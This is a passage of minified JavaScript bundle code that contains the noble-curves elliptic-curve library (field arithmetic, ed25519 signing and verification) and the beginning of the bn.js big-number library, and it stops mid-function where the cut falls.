M4=Object.freeze(Object.defineProperty({__proto__:null,aInRange:$r,abool:os,abytes:uh,bitGet:x4,bitLen:lb,bitMask:Ww,bitSet:k4,bytesToHex:ha,bytesToNumberBE:na,bytesToNumberLE:_l,concatBytes:fa,createHmacDrbg:cb,ensureBytes:un,equalBytes:A4,hexToBytes:Dl,hexToNumber:zw,inRange:Tp,isBytes:ua,memoized:ju,notImplemented:R4,numberToBytesBE:Ol,numberToBytesLE:Uu,numberToHexUnpadded:cl,numberToVarBytesBE:T4,utf8ToBytes:b4,validateObject:ic},Symbol.toStringTag,{value:"Module"}));/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const An=BigInt(0),Ht=BigInt(1),Fo=BigInt(2),N4=BigInt(3),O0=BigInt(4),fE=BigInt(5),dE=BigInt(8);function Ut(n,e){const t=n%e;return t>=An?t:e+t}function P4(n,e,t){if(e<An)throw new Error("invalid exponent, negatives unsupported");if(t<=An)throw new Error("invalid modulus");if(t===Ht)return An;let r=Ht;for(;e>An;)e&Ht&&(r=r*n%t),n=n*n%t,e>>=Ht;return r}function Xt(n,e,t){let r=n;for(;e-- >An;)r*=r,r%=t;return r}function B0(n,e){if(n===An)throw new Error("invert: expected non-zero number");if(e<=An)throw new Error("invert: expected positive modulus, got "+e);let t=Ut(n,e),r=e,i=An,s=Ht;for(;t!==An;){const a=r/t,l=r%t,u=i-s*a;r=t,t=l,i=s,s=u}if(r!==Ht)throw new Error("invert: does not exist");return Ut(i,e)}function L4(n){const e=(n-Ht)/Fo;let t,r,i;for(t=n-Ht,r=0;t%Fo===An;t/=Fo,r++);for(i=Fo;i<n&&P4(i,e,n)!==n-Ht;i++)if(i>1e3)throw new Error("Cannot find square root: likely non-prime P");if(r===1){const o=(n+Ht)/O0;return function(l,u){const h=l.pow(u,o);if(!l.eql(l.sqr(h),u))throw new Error("Cannot find square root");return h}}const s=(t+Ht)/Fo;return function(a,l){if(a.pow(l,e)===a.neg(a.ONE))throw new Error("Cannot find square root");let u=r,h=a.pow(a.mul(a.ONE,i),t),f=a.pow(l,s),p=a.pow(l,t);for(;!a.eql(p,a.ONE);){if(a.eql(p,a.ZERO))return a.ZERO;let w=1;for(let k=a.sqr(p);w<u&&!a.eql(k,a.ONE);w++)k=a.sqr(k);const x=a.pow(h,Ht<<BigInt(u-w-1));h=a.sqr(x),f=a.mul(f,x),p=a.mul(p,h),u=w}return f}}function D4(n){if(n%O0===N4){const e=(n+Ht)/O0;return function(r,i){const s=r.pow(i,e);if(!r.eql(r.sqr(s),i))throw new Error("Cannot find square root");return s}}if(n%dE===fE){const e=(n-fE)/dE;return function(r,i){const s=r.mul(i,Fo),o=r.pow(s,e),a=r.mul(i,o),l=r.mul(r.mul(a,Fo),o),u=r.mul(a,r.sub(l,r.ONE));if(!r.eql(r.sqr(u),i))throw new Error("Cannot find square root");return u}}return L4(n)}const O4=(n,e)=>(Ut(n,e)&Ht)===Ht,B4=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function U4(n){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=B4.reduce((r,i)=>(r[i]="function",r),e);return ic(n,t)}function j4(n,e,t){if(t<An)throw new Error("invalid exponent, negatives unsupported");if(t===An)return n.ONE;if(t===Ht)return e;let r=n.ONE,i=e;for(;t>An;)t&Ht&&(r=n.mul(r,i)),i=n.sqr(i),t>>=Ht;return r}function V4(n,e){const t=new Array(e.length),r=e.reduce((s,o,a)=>n.is0(o)?s:(t[a]=s,n.mul(s,o)),n.ONE),i=n.inv(r);return e.reduceRight((s,o,a)=>n.is0(o)?s:(t[a]=n.mul(s,t[a]),n.mul(s,o)),i),t}function ub(n,e){const t=e!==void 0?e:n.toString(2).length,r=Math.ceil(t/8);return{nBitLength:t,nByteLength:r}}function Ap(n,e,t=!1,r={}){if(n<=An)throw new Error("invalid field: expected ORDER > 0, got "+n);const{nBitLength:i,nByteLength:s}=ub(n,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:n,isLE:t,BITS:i,BYTES:s,MASK:Ww(i),ZERO:An,ONE:Ht,create:l=>Ut(l,n),isValid:l=>{if(typeof l!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof l);return An<=l&&l<n},is0:l=>l===An,isOdd:l=>(l&Ht)===Ht,neg:l=>Ut(-l,n),eql:(l,u)=>l===u,sqr:l=>Ut(l*l,n),add:(l,u)=>Ut(l+u,n),sub:(l,u)=>Ut(l-u,n),mul:(l,u)=>Ut(l*u,n),pow:(l,u)=>j4(a,l,u),div:(l,u)=>Ut(l*B0(u,n),n),sqrN:l=>l*l,addN:(l,u)=>l+u,subN:(l,u)=>l-u,mulN:(l,u)=>l*u,inv:l=>B0(l,n),sqrt:r.sqrt||(l=>(o||(o=D4(n)),o(a,l))),invertBatch:l=>V4(a,l),cmov:(l,u,h)=>h?u:l,toBytes:l=>t?Uu(l,s):Ol(l,s),fromBytes:l=>{if(l.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+l.length);return t?_l(l):na(l)}});return Object.freeze(a)}function hb(n){if(typeof n!="bigint")throw new Error("field order must be bigint");const e=n.toString(2).length;return Math.ceil(e/8)}function fb(n){const e=hb(n);return e+Math.ceil(e/2)}function F4(n,e,t=!1){const r=n.length,i=hb(e),s=fb(e);if(r<16||r<s||r>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+r);const o=t?_l(n):na(n),a=Ut(o,e-Ht)+Ht;return t?Uu(a,i):Ol(a,i)}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const pE=BigInt(0),sf=BigInt(1);function Yg(n,e){const t=e.negate();return n?t:e}function db(n,e){if(!Number.isSafeInteger(n)||n<=0||n>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+n)}function Zg(n,e){db(n,e);const t=Math.ceil(e/n)+1,r=2**(n-1);return{windows:t,windowSize:r}}function z4(n,e){if(!Array.isArray(n))throw new Error("array expected");n.forEach((t,r)=>{if(!(t instanceof e))throw new Error("invalid point at index "+r)})}function W4(n,e){if(!Array.isArray(n))throw new Error("array of scalars expected");n.forEach((t,r)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+r)})}const Jg=new WeakMap,pb=new WeakMap;function Xg(n){return pb.get(n)||1}function gb(n,e){return{constTimeNegate:Yg,hasPrecomputes(t){return Xg(t)!==1},unsafeLadder(t,r,i=n.ZERO){let s=t;for(;r>pE;)r&sf&&(i=i.add(s)),s=s.double(),r>>=sf;return i},precomputeWindow(t,r){const{windows:i,windowSize:s}=Zg(r,e),o=[];let a=t,l=a;for(let u=0;u<i;u++){l=a,o.push(l);for(let h=1;h<s;h++)l=l.add(a),o.push(l);a=l.double()}return o},wNAF(t,r,i){const{windows:s,windowSize:o}=Zg(t,e);let a=n.ZERO,l=n.BASE;const u=BigInt(2**t-1),h=2**t,f=BigInt(t);for(let p=0;p<s;p++){const w=p*o;let x=Number(i&u);i>>=f,x>o&&(x-=h,i+=sf);const k=w,I=w+Math.abs(x)-1,A=p%2!==0,b=x<0;x===0?l=l.add(Yg(A,r[k])):a=a.add(Yg(b,r[I]))}return{p:a,f:l}},wNAFUnsafe(t,r,i,s=n.ZERO){const{windows:o,windowSize:a}=Zg(t,e),l=BigInt(2**t-1),u=2**t,h=BigInt(t);for(let f=0;f<o;f++){const p=f*a;if(i===pE)break;let w=Number(i&l);if(i>>=h,w>a&&(w-=u,i+=sf),w===0)continue;let x=r[p+Math.abs(w)-1];w<0&&(x=x.negate()),s=s.add(x)}return s},getPrecomputes(t,r,i){let s=Jg.get(r);return s||(s=this.precomputeWindow(r,t),t!==1&&Jg.set(r,i(s))),s},wNAFCached(t,r,i){const s=Xg(t);return this.wNAF(s,this.getPrecomputes(s,t,i),r)},wNAFCachedUnsafe(t,r,i,s){const o=Xg(t);return o===1?this.unsafeLadder(t,r,s):this.wNAFUnsafe(o,this.getPrecomputes(o,t,i),r,s)},setWindowSize(t,r){db(r,e),pb.set(t,r),Jg.delete(t)}}}function mb(n,e,t,r){if(z4(t,n),W4(r,e),t.length!==r.length)throw new Error("arrays of points and scalars must have equal length");const i=n.ZERO,s=lb(BigInt(t.length)),o=s>12?s-3:s>4?s-2:s?2:1,a=(1<<o)-1,l=new Array(a+1).fill(i),u=Math.floor((e.BITS-1)/o)*o;let h=i;for(let f=u;f>=0;f-=o){l.fill(i);for(let w=0;w<r.length;w++){const x=r[w],k=Number(x>>BigInt(f)&BigInt(a));l[k]=l[k].add(t[w])}let p=i;for(let w=l.length-1,x=i;w>0;w--)x=x.add(l[w]),p=p.add(x);if(h=h.add(p),f!==0)for(let w=0;w<o;w++)h=h.double()}return h}function $w(n){return U4(n.Fp),ic(n,{n:"bigint",h:"bigint",Gx:"field",Gy:"field"},{nBitLength:"isSafeInteger",nByteLength:"isSafeInteger"}),Object.freeze({...ub(n.n,n.nBitLength),...n,p:n.Fp.ORDER})}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const ei=BigInt(0),hr=BigInt(1),of=BigInt(2),$4=BigInt(8),H4={zip215:!0};function q4(n){const e=$w(n);return ic(n,{hash:"function",a:"bigint",d:"bigint",randomBytes:"function"},{adjustScalarBytes:"function",domain:"function",uvRatio:"function",mapToCurve:"function"}),Object.freeze({...e})}function K4(n){const e=q4(n),{Fp:t,n:r,prehash:i,hash:s,randomBytes:o,nByteLength:a,h:l}=e,u=of<<BigInt(a*8)-hr,h=t.create,f=Ap(e.n,e.nBitLength),p=e.uvRatio||((C,M)=>{try{return{isValid:!0,value:t.sqrt(C*t.inv(M))}}catch{return{isValid:!1,value:ei}}}),w=e.adjustScalarBytes||(C=>C),x=e.domain||((C,M,R)=>{if(os("phflag",R),M.length||R)throw new Error("Contexts/pre-hash are not supported");return C});function k(C,M){$r("coordinate "+C,M,ei,u)}function I(C){if(!(C instanceof E))throw new Error("ExtendedPoint expected")}const A=ju((C,M)=>{const{ex:R,ey:j,ez:H}=C,D=C.is0();M==null&&(M=D?$4:t.inv(H));const y=h(R*M),V=h(j*M),oe=h(H*M);if(D)return{x:ei,y:hr};if(oe!==hr)throw new Error("invZ was invalid");return{x:y,y:V}}),b=ju(C=>{const{a:M,d:R}=e;if(C.is0())throw new Error("bad point: ZERO");const{ex:j,ey:H,ez:D,et:y}=C,V=h(j*j),oe=h(H*H),ce=h(D*D),he=h(ce*ce),Ce=h(V*M),Ae=h(ce*h(Ce+oe)),Pe=h(he+h(R*h(V*oe)));if(Ae!==Pe)throw new Error("bad point: equation left != right (1)");const gt=h(j*H),je=h(D*y);if(gt!==je)throw new Error("bad point: equation left != right (2)");return!0});class E{constructor(M,R,j,H){this.ex=M,this.ey=R,this.ez=j,this.et=H,k("x",M),k("y",R),k("z",j),k("t",H),Object.freeze(this)}get x(){return this.toAffine().x}get y(){return this.toAffine().y}static fromAffine(M){if(M instanceof E)throw new Error("extended point not allowed");const{x:R,y:j}=M||{};return k("x",R),k("y",j),new E(R,j,hr,h(R*j))}static normalizeZ(M){const R=t.invertBatch(M.map(j=>j.ez));return M.map((j,H)=>j.toAffine(R[H])).map(E.fromAffine)}static msm(M,R){return mb(E,f,M,R)}_setWindowSize(M){q.setWindowSize(this,M)}assertValidity(){b(this)}equals(M){I(M);const{ex:R,ey:j,ez:H}=this,{ex:D,ey:y,ez:V}=M,oe=h(R*V),ce=h(D*H),he=h(j*V),Ce=h(y*H);return oe===ce&&he===Ce}is0(){return this.equals(E.ZERO)}negate(){return new E(h(-this.ex),this.ey,this.ez,h(-this.et))}double(){const{a:M}=e,{ex:R,ey:j,ez:H}=this,D=h(R*R),y=h(j*j),V=h(of*h(H*H)),oe=h(M*D),ce=R+j,he=h(h(ce*ce)-D-y),Ce=oe+y,Ae=Ce-V,Pe=oe-y,gt=h(he*Ae),je=h(Ce*Pe),Ue=h(he*Pe),Pt=h(Ae*Ce);return new E(gt,je,Pt,Ue)}add(M){I(M);const{a:R,d:j}=e,{ex:H,ey:D,ez:y,et:V}=this,{ex:oe,ey:ce,ez:he,et:Ce}=M;if(R===BigInt(-1)){const at=h((D-H)*(ce+oe)),Xe=h((D+H)*(ce-oe)),an=h(Xe-at);if(an===ei)return this.double();const lt=h(y*of*Ce),ct=h(V*of*he),vn=ct+lt,ut=Xe+at,P=ct-lt,m=h(vn*an),v=h(ut*P),F=h(vn*P),G=h(an*ut);return new E(m,v,G,F)}const Ae=h(H*oe),Pe=h(D*ce),gt=h(V*j*Ce),je=h(y*he),Ue=h((H+D)*(oe+ce)-Ae-Pe),Pt=je-gt,We=je+gt,Ke=h(Pe-R*Ae),ji=h(Ue*Pt),ot=h(We*Ke),vt=h(Ue*Ke),Vi=h(Pt*We);return new E(ji,ot,Vi,vt)}subtract(M){return this.add(M.negate())}wNAF(M){return q.wNAFCached(this,M,E.normalizeZ)}multiply(M){const R=M;$r("scalar",R,hr,r);const{p:j,f:H}=this.wNAF(R);return E.normalizeZ([j,H])[0]}multiplyUnsafe(M,R=E.ZERO){const j=M;return $r("scalar",j,ei,r),j===ei?W:this.is0()||j===hr?this:q.wNAFCachedUnsafe(this,j,E.normalizeZ,R)}isSmallOrder(){return this.multiplyUnsafe(l).is0()}isTorsionFree(){return q.unsafeLadder(this,r).is0()}toAffine(M){return A(this,M)}clearCofactor(){const{h:M}=e;return M===hr?this:this.multiplyUnsafe(M)}static fromHex(M,R=!1){const{d:j,a:H}=e,D=t.BYTES;M=un("pointHex",M,D),os("zip215",R);const y=M.slice(),V=M[D-1];y[D-1]=V&-129;const oe=_l(y),ce=R?u:t.ORDER;$r("pointHex.y",oe,ei,ce);const he=h(oe*oe),Ce=h(he-hr),Ae=h(j*he-H);let{isValid:Pe,value:gt}=p(Ce,Ae);if(!Pe)throw new Error("Point.fromHex: invalid y coordinate");const je=(gt&hr)===hr,Ue=(V&128)!==0;if(!R&&gt===ei&&Ue)throw new Error("Point.fromHex: x=0 and x_0=1");return Ue!==je&&(gt=h(-gt)),E.fromAffine({x:gt,y:oe})}static fromPrivateKey(M){return B(M).point}toRawBytes(){const{x:M,y:R}=this.toAffine(),j=Uu(R,t.BYTES);return j[j.length-1]|=M&hr?128:0,j}toHex(){return ha(this.toRawBytes())}}E.BASE=new E(e.Gx,e.Gy,hr,h(e.Gx*e.Gy)),E.ZERO=new E(ei,hr,hr,ei);const{BASE:O,ZERO:W}=E,q=gb(E,a*8);function L(C){return Ut(C,r)}function N(C){return L(_l(C))}function B(C){const M=t.BYTES;C=un("private key",C,M);const R=un("hashed private key",s(C),2*M),j=w(R.slice(0,M)),H=R.slice(M,2*M),D=N(j),y=O.multiply(D),V=y.toRawBytes();return{head:j,prefix:H,scalar:D,point:y,pointBytes:V}}function z(C){return B(C).pointBytes}function $(C=new Uint8Array,...M){const R=fa(...M);return N(s(x(R,un("context",C),!!i)))}function K(C,M,R={}){C=un("message",C),i&&(C=i(C));const{prefix:j,scalar:H,pointBytes:D}=B(M),y=$(R.context,j,C),V=O.multiply(y).toRawBytes(),oe=$(R.context,V,D,C),ce=L(y+oe*H);$r("signature.s",ce,ei,r);const he=fa(V,Uu(ce,t.BYTES));return un("result",he,t.BYTES*2)}const S=H4;function d(C,M,R,j=S){const{context:H,zip215:D}=j,y=t.BYTES;C=un("signature",C,2*y),M=un("message",M),R=un("publicKey",R,y),D!==void 0&&os("zip215",D),i&&(M=i(M));const V=_l(C.slice(y,2*y));let oe,ce,he;try{oe=E.fromHex(R,D),ce=E.fromHex(C.slice(0,y),D),he=O.multiplyUnsafe(V)}catch{return!1}if(!D&&oe.isSmallOrder())return!1;const Ce=$(H,ce.toRawBytes(),oe.toRawBytes(),M);return ce.add(oe.multiplyUnsafe(Ce)).subtract(he).clearCofactor().equals(E.ZERO)}return O._setWindowSize(8),{CURVE:e,getPublicKey:z,sign:K,verify:d,ExtendedPoint:E,utils:{getExtendedPublicKey:B,randomPrivateKey:()=>o(t.BYTES),precompute(C=8,M=E.BASE){return M._setWindowSize(C),M.multiply(BigInt(3)),M}}}}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Hw=BigInt("57896044618658097711785492504343953926634992332820282019728792003956564819949"),gE=BigInt("19681161376707505956807079304988542015446066515923890162744021073123829784752");BigInt(0);const G4=BigInt(1),mE=BigInt(2);BigInt(3);const Q4=BigInt(5),Y4=BigInt(8);function Z4(n){const e=BigInt(10),t=BigInt(20),r=BigInt(40),i=BigInt(80),s=Hw,a=n*n%s*n%s,l=Xt(a,mE,s)*a%s,u=Xt(l,G4,s)*n%s,h=Xt(u,Q4,s)*u%s,f=Xt(h,e,s)*h%s,p=Xt(f,t,s)*f%s,w=Xt(p,r,s)*p%s,x=Xt(w,i,s)*w%s,k=Xt(x,i,s)*w%s,I=Xt(k,e,s)*h%s;return{pow_p_5_8:Xt(I,mE,s)*n%s,b2:a}}function J4(n){return n[0]&=248,n[31]&=127,n[31]|=64,n}function X4(n,e){const t=Hw,r=Ut(e*e*e,t),i=Ut(r*r*e,t),s=Z4(n*i).pow_p_5_8;let o=Ut(n*r*s,t);const a=Ut(e*o*o,t),l=o,u=Ut(o*gE,t),h=a===n,f=a===Ut(-n,t),p=a===Ut(-n*gE,t);return h&&(o=l),(f||p)&&(o=u),O4(o,t)&&(o=Ut(-o,t)),{isValid:h||f,value:o}}const eL=(()=>Ap(Hw,void 0,!0))(),tL=(()=>({a:BigInt(-1),d:BigInt("37095705934669439343138083508754565189542113879843219016388785533085940283555"),Fp:eL,n:BigInt("7237005577332262213973186563042994240857116359379907606001950938285454250989"),h:Y4,Gx:BigInt("15112221349535400772501151409588531511454012693041857206046113283949847762202"),Gy:BigInt("46316835694926478169428394003475163141307993866256225615783033603165251855960"),hash:E4,randomBytes:sb,adjustScalarBytes:J4,uvRatio:X4}))(),bp=(()=>K4(tL))();var qw={exports:{}};const nL={},rL=Object.freeze(Object.defineProperty({__proto__:null,default:nL},Symbol.toStringTag,{value:"Module"})),iL=zy(rL);qw.exports;(function(n){(function(e,t){function r(S,d){if(!S)throw new Error(d||"Assertion failed")}function i(S,d){S.super_=d;var _=function(){};_.prototype=d.prototype,S.prototype=new _,S.prototype.constructor=S}function s(S,d,_){if(s.isBN(S))return S;this.negative=0,this.words=null,this.length=0,this.red=null,S!==null&&((d==="le"||d==="be")&&(_=d,d=10),this._init(S||0,d||10,_||"be"))}typeof e=="object"?e.exports=s:t.BN=s,s.BN=s,s.wordSize=26;var o;try{typeof window<"u"&&typeof window.Buffer<"u"?o=window.Buffer:o=iL.Buffer}catch{}s.isBN=function(d){return d instanceof s?!0:d!==null&&typeof d=="object"&&d.constructor.wordSize===s.wordSize&&Array.isArray(d.words)},s.max=function(d,_){return d.cmp(_)>0?d:_},s.min=function(d,_){return d.cmp(_)<0?d:_},s.prototype._init=function(d,_,C){if(typeof d=="number")return this._initNumber(d,_,C);if(typeof d=="object")return this._initArray(d,_,C);_==="hex"&&(_=16),r(_===(_|0)&&_>=2&&_<=36),d=d.toString().replace(/\s+/g,"");var M=0;d[0]==="-"&&(M++,this.negative=1),M<d.length&&(_===16?this._parseHex(d,M,C):(this._parseBase(d,_,M),C==="le"&&this._initArray(this.toArray(),_,C)))},s.prototype._initNumber=function(d,_,C){d<0&&(this.negative=1,d=-d),d<67108864?(this.words=[d&67108863],this.length=1):d<4503599627370496?(this.words=[d&67108863,d/67108864&67108863],this.length=2):(r(d<9007199254740992),this.words=[d&67108863,d/67108864&67108863,1],this.length=3),C==="le"&&this._initArray(this.toArray(),_,C)},s.prototype._initArray=function(d,_,C){if(r(typeof d.length=="number"),d.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(d.length/3),this.words=new Array(this.length);for(var M=0;M<this.length;M++)this.words[M]=0;var R,j,H=0;if(C==="be")for(M=d.length-1,R=0;M>=0;M-=3)j=d[M]|d[M-1]<<8|d[M-2]<<16,this.words[R]|=j<<H&67108863,this.words[R+1]=j>>>26-H&67108863,H+=24,H>=26&&(H-=26,R++);else if(C==="le")for(M=0,R=0;M<d.length;M+=3)j=d[M]|d[M+1]<<8|d[M+2]<<16,this.words[R]|=j<<H&67108863,this.words[R+1]=j>>>26-H&67108863,H+=24,H>=26&&(H-=26,R++);return this._strip()};function a(S,d){var _=S.charCodeAt(d);if(_>=48&&_<=57)return _-48;if(_>=65&&_<=70)return _-55;if(_>=97&&_<=102)return _-87;r(!1,"Invalid character in "+S)}function l(S,d,_){var C=a(S,_);return _-1>=d&&(C|=a(S,_-1)<<4),C}s.prototype._parseHex=function(d,_,C){this.length=Math.ceil((d.length-_)/6),this.words=new Array(this.length);for(var M=0;M<this.length;M++)this.words[M]=0;var R=0,j=0,H;if(C==="be")for(M=d.length-1;M>=_;M-=2)H=l(d,_,M)<<R,this.words[j]|=H&67108863,R>=18?(R-=18,j+=1,this.words[j]|=H>>>26):R+=8;else{var D=d.length-_;for(M=D%2===0?_+1:_;M<d.length;M+=2)H=l(d,_,M)<<R,this.words[j]|=H&67108863,R>=18?(R-=18,j+=1,this.words[j]|=H>>>26):R+=8}this._strip()};function u(S,d,_,C){for(var M=0,R=0,j=Math.min(S.length,_),H=d;H<j;H++){var D=S.charCodeAt(H)-48;M*=C,D>=49?R=D-49+10:D>=17?R=D-17+10:R=D,r(D>=0&&R<C,"Invalid character"),M+=R}return M}s.prototype._parseBase=function(d,_,C){this.words=[0],this.length=1;for(var M=0,R=1;R<=67108863;R*=_)M++;M--,R=R/_|0;for(var j=d.length-C,H=j%M,D=Math.min(j,j-H)+C,y=0,V=C;V<D;V+=M)y=u(d,V,V+M,_),this.imuln(R),this.words[0]+y<67108864?this.words[0]+=y:this._iaddn(y);if(H!==0){var oe=1;for(y=u(d,V,d.length,_),V=0;V<H;V++)oe*=_;this.imuln(oe),this.words[0]+y<67108864?this.words[0]+=y:this._iaddn(y)}this._strip()},s.prototype.copy=function(d){d.words=new Array(this.length);for(var _=0;_<this.length;_++)d.words[_]=this.words[_];d.length=this.length,d.negative=this.negative,d.red=this.red};function h(S,d){S.words=d.words,S.length=d.length,S.negative=d.negative,S.red=d.red}if(s.prototype._move=function(d){h(d,this)},s.prototype.clone=function(){var d=new s(null);return this.copy(d),d},s.prototype._expand=function(d){for(;this.length<d;)this.words[this.length++]=0;return this},s.prototype._strip=function(){for(;this.length>1&&this.words[this.length-1]===0;)this.length--;return this._normSign()},s.prototype._normSign=function(){return this.length===1&&this.words[0]===0&&(this.negative=0),this},typeof Symbol<"u"&&typeof Symbol.for=="function")try{s.prototype[Symbol.for("nodejs.util.inspect.custom")]=f}catch{s.prototype.inspect=f}else s.prototype.inspect=f;function f(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var p=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],w=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],x=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];s.prototype.toString=function(d,_){d=d||10,_=_|0||1;var C;if(d===16||d==="hex"){C="";for(var M=0,R=0,j=0;j<this.length;j++){var H=this.words[j],D=((H<<M|R)&16777215).toString(16);R=H>>>24-M&16777215,M+=2,M>=26&&(M-=26,j--),R!==0||j!==this.length-1?C=p[6-D.length]+D+C:C=D+C}for(R!==0&&(C=R.toString(16)+C);C.length%_!==0;)C="0"+C;return this.negative!==0&&(C="-"+C),C}if(d===(d|0)&&d>=2&&d<=36){var y=w[d],V=x[d];C="";var oe=this.clone();for(oe.negative=0;!oe.isZero();){var ce=oe.modrn(V).toString(d);oe=oe.idivn(V),oe.isZero()?C=ce+C:C=p[y-ce.length]+ce+C}for(this.isZero()&&(C="0"+C);C.length%_!==0;)C="0"+C;return this.negative!==0&&(C="-"+C),C}r(!1,"Base should be between 2 and 36")},s.prototype.toNumber=function(){var d=this.words[0];return this.length===2?d+=this.words[1]*67108864:this.length===3&&this.words[2]===1?d+=4503599627370496+this.words[1]*67108864:this.length>2&&r(!1,"Number can only safely store up to 53 bits"),this.negative!==0?-d:d},s.prototype.toJSON=function(){return this.toString(16,2)},o&&(s.prototype.toBuffer=function(d,_){return this.toArrayLike(o,d,_)}),s.prototype.toArray=function(d,_){return this.toArrayLike(Array,d,_)};var k=function(d,_){return d.allocUnsafe?d.allocUnsafe(_):new d(_)};s.prototype.toArrayLike=function(d,_,C){this._strip();var M=this.byteLength(),R=C||Math.max(1,M);r(M<=R,"byte array longer than desired length"),r(R>0,"Requested array length <= 0");var j=k(d,R),H=_==="le"?"LE":"BE";return this["_toArrayLike"+H](j,M),j},s.prototype._toArrayLikeLE=function(d,_){for(var C=0,M=0,R=0,j=0;R<this.length;R++){var H=this.words[R]<<j|M;d[C++]=H&255,C<d.length&&(d[C++]=H>>8&255),C<d.length&&(d[C++]=H>>16&255),j===6?(C<d.length&&(d[C++]=H>>24&255),M=0,j=0):(M=H>>>24,j+=2)}if(C<d.length)for(d[C++]=M;C<d.length;)d[C++]=0},s.prototype._toArrayLikeBE=function(d,_){for(var C=d.length-1,M=0,R=0,j=0;R<this.length;R++){var H=this.words[R]<<j|M;d[C--]=H&255,C>=0&&(d[C--]=H>>8&255),C>=0&&(d[C--]=H>>16&255),j===6?(C>=0&&(d[C--]=H>>24&255),M=0,j=0):(M=H>>>24,j+=2)}if(C>=0)for(d[C--]=M;C>=0;)d[C--]=0},Math.clz32?s.prototype._countBits=function(d){return 32-Math.clz32(d)}:s.prototype._countBits=function(d){var _=d,C=0;return _>=4096&&(C+=13,_>>>=13),_>=64&&(C+=7,_>>>=7),_>=8&&(C+=4,_>>>=4),_>=2&&(C+=2,_>>>=2),C+_},s.prototype._zeroBits=function(d){if(d===0)return 26;var _=d,C=0;return _&8191||(C+=13,_>>>=13),_&127||(C+=7,_>>>=7),_&15||(C+=4,_>>>=4),_&3||(C+=2,_>>>=2),_&1||C++,C},s.prototype.bitLength=function(){var d=this.words[this.length-1],_=this._countBits(d);return(this.length-1)*26+_};function I(S){for(var d=new Array(S.bitLength()),_=0;_<d.length;_++){var C=_/26|0,M=_%26;d[_]=S.words[C]>>>M&1}return d}s.prototype.zeroBits=function(){if(this.isZero())return 0;for(var d=0,_=0;_<this.length;_++){var C=this._zeroBits(this.words[_]);if(d+=C,C!==26)break}return d},s.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},s.prototype.toTwos=function(d){return this.negative!==0?this.abs().inotn(d).iaddn(1):this.clone()},s.prototype.fromTwos=function(d){return this.testn(d-1)?this.notn(d).iaddn(1).ineg():this.clone()},s.prototype.isNeg=function(){return this.negative!==0},s.prototype.neg=function(){return this.clone().ineg()},s.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},s.prototype.iuor=function(d){for(;this.length<d.length;)this.words[this.length++]=0;for(var _=0;_<d.length;_++)this.words[_]=this.words[_]|d.words[_];return this._strip()},s.prototype.ior=function(d){return r((this.negative|d.negative)===0),this.iuor(d)},s.prototype.or=function(d){return this.length>d.length?this.clone().ior(d):d.clone().ior(this)},s.prototype.uor=function(d){return this.length>d.length?this.clone().iuor(d):d.clone().iuor(this)},s.prototype.iuand=function(d){var _;this.length>d.length?_=d:_=this;for(var C=0;C<_.length;C++)this.words[C]=this.words[C]&d.words[C];return this.length=_.length,this._strip()},s.prototype.iand=function(d){return r((this.negative|d.negative)===0),this.iuand(d)},s.prototype.and=function(d){return this.length>d.length?this.clone().iand(d):d.clone().iand(this)},s.prototype.uand=function(d){return this.length>d.length?this.clone().iuand(d):d.clone().iuand(this)},s.prototype.iuxor=function(d){var _,C;this.length>d.length?(_=this,C=d):(_=d,C=this);for(var M=0;M<C.length;M++)this.words[M]=_.words[M]^C.words[M];if(this!==_)for(;M<_.length;M++)this.words[M]=_.words[M];return this.length=_.length,this._strip()},s.prototype.ixor=function(d){return r((this.negative|d.negative)===0),this.iuxor(d)},s.prototype.xor=function(d){return this.length>d.length?this.clone().ixor(d):d.clone().ixor(this)},s.prototype.uxor=function(d){return this.length>d.length?this.clone().iuxor(d):d.clone().iuxor(this)},s.prototype.inotn=function(d){r(typeof d=="number"&&d>=0);var _=Math.ceil(d/26)|0,C=d%26;this._expand(_),C>0&&_--;for(var M=0;M<_;M++)this.words[M]=~this.words[M]&67108863;return C>0&&(this.words[M]=~this.words[M]&67108863>>26-C),this._strip()},s.prototype.notn=function(d){return this.clone().inotn(d)},s.prototype.setn=function(d,_){r(typeof d=="number"&&d>=0);var C=d/26|0,M=d%26;return this._expand(C+1),_?this.words[C]=this.words[C]|1<<M:this.words[C]=this.words[C]&~(1<<M),this._strip()},s.prototype.iadd=function(d){var _;if(this.negative!==0&&d.negative===0)return this.negative=0,_=this.isub(d),this.negative^=1,this._normSign();if(this.negative===0&&d.negative!==0)return d.negative=0,_=this.isub(d),d.negative=1,_._normSign();var C,M;this.length>d.length?(C=this,M=d):(C=d,M=this);for(var R=0,j=0;j<M.length;j++)_=(C.words[j]|0)+(M.words[j]|0)+R,this.words[j]=_&67108863,R=_>>>26;for(;R!==0&&j<C.length;j++)_=(C.words[j]|0)+R,this.words[j]=_&67108863,R=_>>>26;if(this.length=C.length,R!==0)this.words[this.length]=R,this.length++;else 